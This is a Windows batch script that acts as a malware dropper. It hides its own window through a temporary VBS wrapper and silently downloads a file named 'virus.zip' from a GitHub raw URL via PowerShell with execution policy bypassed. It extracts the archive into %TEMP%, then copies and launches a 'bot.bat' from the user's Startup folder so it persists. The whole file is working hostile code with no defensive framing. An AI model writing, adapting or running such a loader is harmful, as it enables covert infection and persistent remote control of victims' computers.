@echo off
setlocal enabledelayedexpansion

:: Hide this window using a VBS wrapper
if not "%1"=="H" (
    echo Set WshShell = CreateObject("WScript.Shell"^) > "%temp%\hide.vbs"
    echo WshShell.Run """" & WScript.ScriptFullName & """ H", 0, False >> "%temp%\hide.vbs"
    wscript.exe "%temp%\hide.vbs"
    exit /b
)

set "tempdir=%TEMP%"
set "zipurl=https://raw.githubusercontent.com/banzoxOG/zip/main/virus.zip"
set "zipfile=%tempdir%\virus.zip"

:: Download the zip using PowerShell silently
powershell -NoProfile -ExecutionPolicy Bypass -Command "& { Invoke-WebRequest -Uri '%zipurl%' -OutFile '%zipfile%'; }" >nul 2>&1

:: Wait a moment for download to complete
timeout /t 2 /nobreak >nul

:: Extract all files directly to %TEMP% (not a subfolder), overwrite silently
powershell -NoProfile -ExecutionPolicy Bypass -Command "& { Expand-Archive -Path '%zipfile%' -DestinationPath '%tempdir%' -Force; }" >nul 2>&1

:: Delete the zip file after extraction (optional, comment out if you want to keep)
:: del /f /q "%zipfile%" >nul 2>&1

:: Copy bot.bat to shell:startup (Startup folder)
set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
if exist "%tempdir%\bot.bat" (
    copy /y "%tempdir%\bot.bat" "%startup%\bot.bat" >nul 2>&1
    :: Run bot.bat from temp directory (or from startup)
    start "" /B "%tempdir%\bot.bat"
)

:: Cleanup the VBS helper
del /f /q "%temp%\hide.vbs" >nul 2>&1

exit
